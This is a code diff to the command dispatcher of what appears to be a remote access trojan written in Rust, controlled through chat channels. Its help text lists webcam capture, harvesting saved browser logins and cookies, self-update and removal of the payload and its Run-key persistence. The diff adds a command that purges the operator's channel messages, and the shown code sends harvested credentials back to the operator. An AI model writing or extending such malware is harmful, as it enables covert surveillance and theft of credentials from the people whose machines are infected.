@@ -39,6 +39,7 @@ const HELP: &str = "\
 !volume [0-100|mute|unmute] system volume
 !webcam                    camera still -> files channel
 !browsers                  saved logins + cookies (chrome/edge/firefox)
+!clear [info|files]        delete messages in #console (or #information / #files)
 !lock                      lock workstation
 !update                    pull newest build from #update and restart
 !uninstall                 remove payload + launcher + Run key, then stop
@@ -295,6 +296,16 @@ pub async fn dispatch(
         "browsers" | "creds" => {
             let r = tokio::task::spawn_blocking(crate::browsers::harvest).await?;
             st.send_code(console, &r).await?;
+        }
+        "clear" => {
+            let (target, label) = match arg.trim().to_ascii_lowercase().as_str() {
+                "info" | "information" => (infoch.to_string(), "information"),
+                "files" => (files.to_string(), "files"),
+                _ => (console.to_string(), "console"),
+            };
+            let n = st.purge_channel(&target).await.unwrap_or(0);
+            st.send(console, &format!("cleared {n} message(s) in #{label}"))
+                .await?;
         }
         "lock" => {
             host::lock_workstation();
